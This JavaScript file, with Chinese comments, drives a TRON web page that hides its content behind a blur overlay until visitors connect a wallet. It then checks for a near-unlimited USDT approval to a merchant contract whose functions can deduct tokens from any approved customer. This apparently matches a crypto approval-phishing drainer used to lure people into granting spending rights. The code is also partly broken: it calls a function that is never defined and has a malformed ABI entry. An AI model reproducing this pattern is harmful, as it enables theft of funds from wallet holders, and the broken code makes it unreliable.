// --- 配置常量 (TRON 专属) ---
const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; // 你的 TRON 智能合约地址 (SimpleMerchantERC)
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';  //  TRC20 USDT 合约地址
const DEFAULT_TRON_ADDRESS_HEX = '410000000000000000000000000000000000000000'; //  默认 TRON 地址
const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";

// 你的合约 ABI (SimpleMerchantERC)
const MERCHANT_ABI = [
    {"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},
    {"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},
    {"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},
    {"inputs":[{"indexed":true,"name":"customer","name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},
    {"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},
    {"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},
    {"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},
    {"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},
    {"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},
    {"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},
    {"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}
];

// TRC20 代币的 ABI (USDT)
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address) view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)"
];

// --- UI 元素 (与之前类似) ---
const connectButton = document.getElementById('connectButton');
const blurOverlay = document.getElementById('blurOverlay'); // 获取遮罩层元素
const overlayMessage = document.getElementById('overlayMessage');
const lockedPrompt = document.getElementById('lockedPrompt');
const overlay = document.getElementById('blurOverlay');  // 确保在这里定义
const statusDiv = document.getElementById('status');  //  获取 status 元素，在外面定义，避免重复获取。

// --- 状态变量 ---
let tronWeb;
let userAddress;
let merchantContract;
let usdtContract;
let isConnectedFlag = false;
let accountChangeListener = null;  // 存储账号改变的监听器

// --- 遮罩控制函數 ---
function hideOverlay() {
    if (!overlay) {
        console.error("Overlay element not found.");
        return;
    }
    overlay.style.opacity = '0';
    setTimeout(() => {
        overlay.style.display = 'none';
    }, 300);
}

function showOverlay(message) {
    if (!overlayMessage || !blurOverlay) {
        console.error("Overlay element not found.");
        return;
    }
    overlayMessage.innerHTML = message;
    overlay.style.display = 'flex';
    setTimeout(() => {
        overlay.style.opacity = '1';
    }, 10);
}

// --- 状态更新函数 ---
function updateConnectionUI(connected, address = null) {
    isConnectedFlag = connected;
    if (connectButton) {
        if (connected && address) {
            connectButton.classList.add('connected');
            connectButton.innerHTML = `Connected: ${address.substring(0, 4)}...${address.slice(-4)}`;
            connectButton.title = `Connected: ${address}`;
            hideOverlay(); // 隐藏遮罩
        } else {
            connectButton.classList.remove('connected');
            connectButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
            connectButton.title = 'Connect Wallet';
             //  连接失败，显示遮罩
        }
    }
}

// --- 核心功能：控制状态栏的隐藏与显示。 ---
function updateStatus(message) {
    const statusDiv = document.getElementById('status');
    if (!statusDiv) {
        console.error("Status element not found.");
        return; // 避免设置 innerHTML
    }
    if (message) {
        statusDiv.innerHTML = `${message}`;
        statusDiv.style.display = 'block';
    } else {
        statusDiv.innerHTML = '';
        statusDiv.style.display = 'none';
    }
}

// --- 检查授权状态 (TRON 版本) ---
async function checkAuthorization() {
    try {
        if (!tronWeb || !userAddress || !merchantContract || !usdtContract) {
            showOverlay('Wallet not opened. Please connect.');
            return;
        }

        // 1. 检查 SimpleMerchant 合约授权
        const isAuthorized = await merchantContract.authorized(tronWeb.address.toHex(userAddress)).call(); // 将用户地址转换为 hex 格式

        // 2. 检查 USDT 的授权
        const usdtAllowance = await usdtContract.allowance(userAddress, MERCHANT_CONTRACT_ADDRESS).call();
        const isUsdtMaxApproved = usdtAllowance.gte(tronWeb.toBigNumber(ALMOST_MAX_UINT)); //  檢查是否接近最大值

        let statusMessage = '';

        // SimpleMerchant 合約授權
        if (isAuthorized) {
            statusMessage += 'Web page access authorized ✅. ';
        } else {
            statusMessage += 'Web page access not authorized ❌. ';
        }

        // USDT 的授權狀態
        if (isUsdtMaxApproved) {
            statusMessage += `USDT approved ✅.`;
        } else if (usdtAllowance > 0) { // 检查大于 0
            statusMessage += `USDT approval needed ⚠️.`;
        } else {
            statusMessage += `USDT not approved ❌.`;
        }

        // Button state: needs to be clicked if authorization is incomplete
        const allAuthorized = isAuthorized && isUsdtMaxApproved;  // 只检查 USDT 授权

        if (allAuthorized) {
            connectButton.classList.add('connected');
            connectButton.title = 'Disconnect Wallet';
            connectButton.disabled = false;
            updateStatus(''); // 成功時，清空/隱藏狀態欄
            hideOverlay(); // 完全授權，隐藏遮罩
        } else {
            connectButton.classList.remove('connected');
            connectButton.title = 'Connect Wallet (Complete Authorization)'; // 連繫錢包 (完成授權)
            connectButton.disabled = false;
            updateStatus(''); // 授權未完成，清空/隱藏狀態欄
             //  保持遮罩显示，等待授权
        }
    } catch (error) {
        updateStatus(`Authorization check failed: ${error.message}`);
        console.error("Check Authorization Error:", error);
        showOverlay(`Authorization check failed: ${error.message}`);
    }
}

// --- 连接钱包逻辑 (TRON 版本) ---
async function connectWallet() {
    try {
        updateStatus('Connecting to wallet...'); //  确保先调用 updateStatus
        showOverlay('Please confirm the connection request in your wallet...');

        // 1.  检测 TronWeb (确保先加载)
        if (typeof window.tronWeb === 'undefined') {
            updateStatus('Please install TronLink or a supported TRON wallet');
            return;
        }

        tronWeb = window.tronWeb;  //  将 tronWeb 赋值给全局变量
        console.log("tronWeb detected:", tronWeb); // 调试

        // 2. 检查是否已连接
        if (tronWeb && tronWeb.ready) {
            // 3. 获取用户地址
            userAddress = tronWeb.defaultAddress.base58; // 使用 base58 格式
            if (!userAddress || userAddress === DEFAULT_TRON_ADDRESS_HEX) {
                //  如果还没有连接，则尝试连接。 如果用户未连接，getAccount 将会提示用户连接
                try {
                    await tronWeb.trx.getAccount();  //  尝试获取账户信息, 如果未连接，则会触发 TronLink 弹窗 (Trust Wallet 等)
                    userAddress = tronWeb.defaultAddress.base58; // 再次获取地址
                    console.log("✅ User Address (base58):", userAddress);
                } catch (e) {
                    console.error("Error connecting to wallet:", e);
                    updateConnectionUI(false);
                    showOverlay('🔴 Connection failed: Wallet connection denied or canceled.');
                    updateStatus('Connection failed: Wallet connection denied or canceled.');
                    return;
                }
            }

            if (userAddress && userAddress !== DEFAULT_TRON_ADDRESS_HEX) {
                updateConnectionUI(true, userAddress);  // 更新连接状态
                // 4. 初始化合约并检查授权
                await initialize();
            }
             else {
                 updateConnectionUI(false);
                 showOverlay("🔴 Connection failed: No valid account found.");
                 updateStatus('Connection failed: No valid account found.');
             }

        } else {
            updateConnectionUI(false);
            showOverlay('🔴 Connection failed: TronLink not detected or not ready.');
            updateStatus('Connection failed: TronLink not detected or not ready.');
        }

    } catch (error) {
        console.error("Error connecting to wallet:", error);
        updateConnectionUI(false);
        showOverlay(`🔴 Connection failed: ${error.message}`);
        updateStatus(`Connection failed: ${error.message}`);
    }
}

// --- 处理授权流程 ---
async function handleAuthorization() {
    try {
        if (!tronWeb || !userAddress || !merchantContract || !usdtContract) {
            showOverlay('Wallet not connected. Please connect.');
            return;
        }
        // 检查授权状态
        await checkAuthorization(); // 检查授权并更新 UI
    } catch (error) {
        console.error("Authorization process failed:", error);
        showOverlay(`🔴 Authorization process failed: ${error.message}`);
        updateStatus(`Authorization failed: ${error.message}`);
    }
}

// --- 斷開錢包連接 ---
function disconnectWallet() {
    userAddress = null;
    tronWeb = null;  // 必须设置为 null
    merchantContract = null;
    usdtContract = null;
    usdcContract = null; // 移除
    updateConnectionUI(false);
    showOverlay('Please link your wallet to unlock the page 🔒');
}

// 事件监听器 (与之前类似)
connectButton.addEventListener('click', () => {
    if (isConnectedFlag) {
        disconnectWallet(); // 断开钱包
    } else {
        connectWallet(); // 连接钱包
    }
});

// 页面加载完成后，初始化
window.onload = () => {
    //  在页面加载时，隐藏遮罩
    updateConnectionUI(false);
    showOverlay('Please connect your wallet to unlock the content. Click the wallet icon in the upper right corner.');
};